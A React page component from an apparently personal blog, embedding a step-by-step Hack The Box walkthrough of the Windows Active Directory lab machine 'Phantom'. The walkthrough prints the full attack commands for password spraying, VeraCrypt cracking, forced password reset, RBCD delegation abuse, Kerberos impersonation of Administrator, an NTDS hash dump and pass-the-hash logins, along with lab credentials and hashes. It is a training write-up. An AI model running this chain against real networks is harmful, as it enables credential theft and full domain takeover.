import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './PhantomWalkthrough.css';

const PhantomWalkthrough = () => {
  const navigate = useNavigate();

  // CodeBlock component for terminal-like code blocks
  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);
    
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };

    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';

    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button 
            className={'copy-button ' + (copied ? 'copied' : '')}
            onClick={handleCopy}
            title={copied ? 'Copied!' : 'Copy to clipboard'}
          >
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  // Function to parse inline markdown (bold, italic, inline code, links)
  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;
    
    // Regex to match [text](url), **bold**, *italic*, and `code`
    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;
    
    while ((match = regex.exec(text)) !== null) {
      // Add text before the match
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }
      
      const matched = match[0];
      
      if (matched.startsWith('[') && matched.includes('](')) {
        // Link [text](url)
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(
            <a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">
              {linkText}
            </a>
          );
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        // Bold text
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        // Italic text
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        // Inline code
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }
      
      lastIndex = regex.lastIndex;
    }
    
    // Add remaining text
    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }
    
    return parts.length > 0 ? parts : text;
  };

  // Phantom data
    const writeup = {
    id: 'phantom-walkthrough',
    title: 'Phantom Walkthrough',
    excerpt: 'Phantom is a medium difficulty Windows Active Directory machine. Guest SMB access reveals a PDF containing a default password, which is sprayed to gain initial credentials. A VeraCrypt-encrypted backup is cracked with hashcat, exposing a VyOS configuration with service account credentials. WinRM access as svc_sspr allows resetting a user password via SSPR, enabling a Resource Based Constrained Delegation (RBCD) attack to impersonate Administrator and achieve full domain compromise.',
    date: 'Jul 28, 2026',
    tags: ['Htb', 'Windows', 'Ad', 'Smb', 'Ldap', 'Password-Spraying', 'Password-Cracking', 'RBCD', 'VeraCrypt', 'Kerberos'],
    difficulty: 'Medium',
    os: 'Windows',
    ip: '10.129.64.171',
    content: `## Overview
Phantom is a **medium** difficulty Windows Active Directory machine from **Hack The Box**. The attack begins with SMB guest access that reveals a Public share containing an email with a base64-encoded PDF attachment. The PDF is a welcome template disclosing a default password, which is sprayed across domain users to find valid credentials for \`ibryant\`. With authenticated access, a VeraCrypt-encrypted backup file is found in the Departments share. Cracking it with hashcat reveals a VyOS network configuration containing plaintext credentials for the \`svc_sspr\` service account. This account has WinRM access and, through BloodHound analysis, is found to have **ForceChangePassword** privileges over several users, including \`wsilva\`, who is a member of the **ICT_SECURITY** group. That group holds **AddAllowedToAct** rights on the Domain Controller, enabling a **Resource Based Constrained Delegation (RBCD)** attack. By resetting \`wsilva\`'s password, configuring RBCD delegation, and using **S4U2Self+U2U** Kerberos impersonation, the attacker obtains a ticket as Administrator. This ticket is used to dump the NTDS database via netexec, and the Administrator NTLM hash grants full domain compromise through WinRM.

## Enumeration

### Port Scanning
Running \`Nmap\` port scanner to enumerate the services running on the target machine. The scan reveals several critical ports typical of a Windows Active Directory Domain Controller, including DNS (53), Kerberos (88), LDAP (389, 636, 3268, 3269), SMB (445), and WinRM (5985):
\`\`\`bash
sudo nmap -vv -sS -Pn -sV -sC -p- --min-rate=10000 10.129.64.171 -oN nmap/log.nmap

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-17 01:00:00Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
\`\`\`

We can see some important open ports:
• **Port 53**: DNS service running Simple DNS Plus
• **Port 88**: Kerberos authentication service
• **Port 135**: Microsoft Windows RPC service
• **Port 139**: NetBIOS service
• **Port 389**: LDAP service running Microsoft Windows Active Directory LDAP (Domain: phantom.vl)
• **Port 445**: SMB service
• **Port 636**: LDAP over SSL service
• **Port 5985**: WinRM service (HTTP)

Adding domains into hosts file.
\`\`\`bash
echo '10.129.64.171 phantom.vl dc.phantom.vl' | sudo tee -a /etc/hosts
\`\`\`

### SMB Guest Access
The initial enumeration starts with netexec to check for SMB access using a guest session. The target is running Windows Server 2022 Build 20348, and the domain is \`phantom.vl\`. Guest authentication is allowed with NULL credentials, and the share listing reveals two readable shares: \`IPC$\` and \`Public\`:
\`\`\`bash
nxc smb 10.129.64.171 -u 'guest' -p '' --shares
\`\`\`
![SMB guest share enumeration showing Public and IPC$ with READ access](/images/writeups/phantom/1.png)

### Public Share
Connecting to the Public share via smbclient as guest reveals a single file: \`tech_support_email.eml\`. The file is downloaded for local analysis:
\`\`\`bash
smbclient //10.129.64.171/Public -U guest
\`\`\`
![smbclient accessing Public share and downloading tech_support_email.eml](/images/writeups/phantom/2.png)

### Email Analysis
The \`.eml\` file contains a base64-encoded attachment with the filename \`welcome_template.pdf\`. The full base64 blob is visible in the email body:
![Email content showing base64-encoded PDF attachment with filename welcome_template.pdf](/images/writeups/phantom/3.png)

Extracting the base64 content and decoding it produces the PDF file:
\`\`\`bash
base64 -d > welcome_template.pdf
\`\`\`
![Decoded welcome_template.pdf alongside the original .eml file](/images/writeups/phantom/4.png)

### Default Password
Opening the PDF reveals a welcome message from "The Phantom Team" containing default credentials. The username field is a placeholder (\`<USERNAME>\`), but the password is hardcoded: \`Ph4nt0m@5t4rt!\`. The message recommends changing it after first login, suggesting this password may still be in use by some accounts:
![Welcome template PDF showing default password Ph4nt0m@5t4rt!](/images/writeups/phantom/5.png)

### Password Spraying
Using the discovered default password, a spray is executed against a list of domain users with netexec. The \`--continue-on-success\` flag ensures all users are tested, and \`--no-bruteforce\` pairs each user with the single password. The result shows a valid hit: \`ibryant:Ph4nt0m@5t4rt!\`:
\`\`\`bash
nxc smb 10.129.64.171 -u users.txt -p 'Ph4nt0m@5t4rt!' --continue-on-success --no-bruteforce
\`\`\`
![Password spray results showing ibryant as valid with the default password](/images/writeups/phantom/6.png)

### Authenticated Share Enumeration
With \`ibryant\`'s credentials, the share listing is re-run. The user now has READ access to the \`Departments Share\`, in addition to the previously accessible shares:
\`\`\`bash
nxc smb 10.129.64.171 -u ibryant -p 'Ph4nt0m@5t4rt!' --shares
\`\`\`
![ibryant share enumeration showing READ access to Departments Share](/images/writeups/phantom/7.png)

### Departments Share
Connecting to the Departments Share reveals a directory structure with Finance, HR, and IT folders. Inside the IT directory, a \`Backup\` folder contains a VeraCrypt container file \`IT_BACKUP_201123.hc\`, alongside several IT tool installers (mRemoteNG, TeamViewer, VeraCrypt, Wireshark):
\`\`\`bash
smbclient '//10.129.64.171/Departments Share' -U ibryant
\`\`\`
![Departments Share contents showing IT/Backup with IT_BACKUP_201123.hc VeraCrypt container](/images/writeups/phantom/8.png)

## Foothold

### Cracking the VeraCrypt Container
The VeraCrypt container uses VeraCrypt SHA512 + XTS 512 bit (legacy), which corresponds to hashcat mode 13721. Since the default password followed the pattern \`Ph4nt0m@5t4rt!\` (word + symbols + digits), a custom wordlist is generated recognizing this pattern, combining variations of the machine name with years and special characters:
\`\`\`bash
#!/bin/bash

WORDS=("Phantom" "phantom" "Ph4nt0m" "ph4nt0m")
YEARS=("2023" "2024" "2025")
SYMBOLS=("!" "@" "#" "_" "$")
OUTPUT="phantom_custom.txt"

> $OUTPUT

for w in "\${WORDS[@]}"; do
    for y in "\${YEARS[@]}"; do
        for s in "\${SYMBOLS[@]}"; do
            echo "\${w}\${y}\${s}" >> $OUTPUT
            echo "\${w}\${s}\${y}" >> $OUTPUT
            echo "\${y}\${w}\${s}" >> $OUTPUT
            echo "\${y}\${s}\${w}" >> $OUTPUT
            echo "\${s}\${w}\${y}" >> $OUTPUT
            echo "\${s}\${y}\${w}" >> $OUTPUT
        done
    done
done
\`\`\`

Running hashcat with the generated wordlist cracks the container in seconds, recovering the password \`Phantom2023!\`:
\`\`\`bash
hashcat -m 13721 -a 0 IT_BACKUP_201123.hc phantom_custom.txt
\`\`\`
![hashcat cracking the VeraCrypt container with password Phantom2023!](/images/writeups/phantom/9.png)

### Mounting the Backup
With the cracked password, the VeraCrypt container is mounted. The contents include Azure VM configurations, Splunk logs, a ticketing system backup, and most importantly, a \`vyos_backup.tar.gz\` file:
\`\`\`bash
mkdir mnt_phantom
veracrypt -t -k "" --pim=0 --protect-hidden=no IT_BACKUP_201123.hc mnt_phantom/
\`\`\`
![VeraCrypt container mounted showing backup files including vyos_backup.tar.gz](/images/writeups/phantom/10.png)

### VyOS Configuration
Extracting the VyOS backup reveals a \`config.boot\` file containing the full network device configuration:
\`\`\`bash
tar xzf vyos_backup.tar.gz
\`\`\`

Inside the VPN SSTP section, a local user is configured with plaintext credentials: \`lstanley\` with password \`qB6XTcqVP5MLP7Rc\`:
![VyOS config.boot showing SSTP VPN credentials for lstanley](/images/writeups/phantom/11.png)

### Second Password Spray
The password found in the VyOS configuration is sprayed against all domain users. This time, the valid hit is the service account \`svc_sspr\`:
\`\`\`bash
nxc smb 10.129.64.171 -u users.txt -p 'qB6XTcqVP5MLP7Rc' --continue-on-success --no-bruteforce
\`\`\`
![Password spray with VyOS password showing svc_sspr as valid](/images/writeups/phantom/12.png)

### WinRM Access
The \`svc_sspr\` account has WinRM access on the target. Connecting with evil-winrm and navigating to the Desktop reveals the user flag:
\`\`\`bash
evil-winrm -i 10.129.64.171 -u svc_sspr -p 'qB6XTcqVP5MLP7Rc'
\`\`\`
![evil-winrm shell as svc_sspr with user flag](/images/writeups/phantom/13.png)

## Privilege Escalation

### BloodHound Analysis
Running BloodHound collection with \`bloodhound-python\` to map out the Active Directory structure and identify potential attack paths:
\`\`\`bash
bloodhound-python -u "svc_sspr" -p 'qB6XTcqVP5MLP7Rc' -d phantom.vl -ns 10.129.64.171 -c ALL --zip
\`\`\`

Analyzing the data reveals a clear attack path. The \`svc_sspr\` account has **ForceChangePassword** rights over three domain users: \`RNICHOLS\`, \`WSILVA\`, and \`CROSE\`:
![BloodHound showing svc_sspr ForceChangePassword on three users](/images/writeups/phantom/14.png)

Expanding the graph further shows the complete path to Domain Admin. Both \`RNICHOLS\` and \`WSILVA\` are members of the \`ICT_SECURITY\` group, which has **AddAllowedToAct** rights on the Domain Controller (\`DC.PHANTOM.VL\`). This means any member of ICT_SECURITY can configure Resource Based Constrained Delegation on the DC:
![BloodHound expanded view showing ICT_SECURITY AddAllowedToAct on DC.PHANTOM.VL](/images/writeups/phantom/15.png)

### Resetting wsilva's Password
The first step in the exploitation chain is to abuse \`svc_sspr\`'s ForceChangePassword privilege to reset \`wsilva\`'s password. This is done through netexec's \`change-password\` module:
\`\`\`bash
nxc smb dc.phantom.vl -u svc_sspr -p qB6XTcqVP5MLP7Rc -M change-password -o USER=wsilva NEWPASS=v01v01v01
\`\`\`
![netexec successfully changing wsilva password](/images/writeups/phantom/17.png)

### RBCD Delegation Setup
With \`wsilva\`'s new credentials and its membership in ICT_SECURITY, the RBCD delegation is configured using \`rbcd.py\` from Impacket. This sets the \`msDS-AllowedToActOnBehalfOfOtherIdentity\` attribute on the DC$ computer object, allowing \`wsilva\` to impersonate any user on the DC via S4U2Proxy:
\`\`\`bash
rbcd.py -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:v01v01v01 -dc-ip 10.129.64.171
\`\`\`
![rbcd.py confirming delegation rights for wsilva on DC$](/images/writeups/phantom/18.png)

### Requesting a TGT
A Kerberos TGT is requested for \`wsilva\` using \`getTGT.py\`. The ticket is saved to \`wsilva.ccache\`. Running \`describeTicket.py\` confirms the ticket details, showing a valid TGT for \`wsilva\` with service \`krbtgt/PHANTOM.VL\`:
\`\`\`bash
getTGT.py phantom.vl/wsilva:v01v01v01
describeTicket.py wsilva.ccache
\`\`\`
![getTGT and describeTicket showing valid wsilva TGT](/images/writeups/phantom/19.png)

### Setting NTLM Hash
To perform the U2U (User-to-User) Kerberos authentication, the password needs to be set as an NTLM hash using \`changepasswd.py\`. This ensures the encryption types align correctly for the S4U2Self+U2U request:
\`\`\`bash
changepasswd.py -newhashes :fc3772be4c265a69d2a09afd8d02b41a phantom/wsilva:v01v01v01@dc.phantom.vl
\`\`\`
![changepasswd.py setting NTLM hash for wsilva](/images/writeups/phantom/20.png)

### U2U Impersonation
The final Kerberos step uses \`getST.py\` with the \`-u2u\` flag to perform a S4U2Self+U2U request, impersonating Administrator. The \`-k\` and \`-no-pass\` flags indicate Kerberos authentication using the cached TGT. The resulting ticket is saved as \`Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache\`:
\`\`\`bash
KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
\`\`\`
![getST.py performing U2U impersonation as Administrator](/images/writeups/phantom/21.png)

### Verifying Administrator Access
Using the impersonated Administrator ticket with netexec confirms full domain compromise. The \`Pwn3d!\` flag indicates administrative access over the Domain Controller:
\`\`\`bash
KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache netexec smb dc.phantom.vl --use-kcache
\`\`\`
![netexec confirming Administrator access via Kerberos ccache with Pwn3d!](/images/writeups/phantom/22.png)

### NTDS Dump
With Administrator access confirmed, the NTDS database is dumped to extract the Administrator's NTLM hash for persistent access:
\`\`\`bash
KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache netexec smb dc.phantom.vl --use-kcache --ntds --user Administrator
\`\`\`
![NTDS dump revealing Administrator NTLM hash](/images/writeups/phantom/24.png)

### Root Flag
Finally, the Administrator NTLM hash is used with evil-winrm for a pass-the-hash login. The root flag is on the Administrator's Desktop:
\`\`\`bash
evil-winrm -i 10.129.64.171 -u Administrator -H aa2abd9db4f5984e657f834484512117
\`\`\`
![evil-winrm as Administrator with root flag](/images/writeups/phantom/25.png)

## Conclusion
Phantom is a medium-difficulty Windows Active Directory machine that demonstrates a realistic attack chain combining credential discovery from multiple sources with advanced Kerberos exploitation techniques. The machine showcases how default passwords, improperly secured backups, and misconfigured Active Directory permissions can lead to full domain compromise.

The attack path involved:

• **SMB Guest Enumeration**: Accessing the Public share as guest to retrieve an email containing a base64-encoded PDF with default credentials \`Ph4nt0m@5t4rt!\`
• **Password Spraying**: Spraying the default password across domain users to find \`ibryant\` still using the default credentials
• **VeraCrypt Cracking**: Discovering an encrypted VeraCrypt container (\`IT_BACKUP_201123.hc\`) in the Departments share and cracking it with hashcat to recover the password \`Phantom2023!\`
• **VyOS Configuration**: Extracting plaintext VPN credentials (\`qB6XTcqVP5MLP7Rc\`) from a VyOS \`config.boot\` backup inside the container
• **Second Password Spray**: Spraying the VyOS password to discover the \`svc_sspr\` service account and gaining WinRM access
• **BloodHound Analysis**: Mapping the attack path from \`svc_sspr\` (ForceChangePassword) through \`wsilva\` (ICT_SECURITY member) to the Domain Controller (AddAllowedToAct)
• **RBCD + U2U Exploitation**: Resetting \`wsilva\`'s password, configuring Resource Based Constrained Delegation, and using S4U2Self+U2U Kerberos impersonation to obtain an Administrator ticket
• **Domain Compromise**: Dumping the NTDS database to extract the Administrator NTLM hash and achieving full domain control via pass-the-hash

**Tools Used**: Nmap, NetExec (nxc), smbclient, hashcat, VeraCrypt, Evil-WinRM, BloodHound, Impacket (rbcd.py, getTGT.py, getST.py, changepasswd.py, describeTicket.py)

The machine highlights the risks of storing default passwords in shared documents, leaving encrypted backups accessible to low-privilege users with weak passwords, and granting service accounts excessive Active Directory privileges like ForceChangePassword without proper monitoring.
`};

  return (
    <>
      <DynamicSEO 
        type="writeup" 
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/phantom/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }} 
      />
      <motion.div 
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1 id="writeup-title">{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/phantom/machine.png" alt="Phantom" className="machine-image" />
          </div>
        </div>
      </div>

          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks with CodeBlock component
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.startsWith('<InfoStatus')) {
                  // Handle InfoStatus component
                  const titleMatch = line.match(/title="([^"]*)"/);
                  const messageMatch = line.match(/message="([^"]*)"/);
                  if (titleMatch && messageMatch) {
                    elements.push(
                      <InfoStatus 
                        key={i} 
                        title={titleMatch[1]} 
                        message={messageMatch[1]} 
                      />
                    );
                  }
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
      </div>

      <TableOfContents content={writeup.content} title={writeup.title} />
      
      <ScrollToTop />
      </motion.div>
    </>
  );
};

export default PhantomWalkthrough;
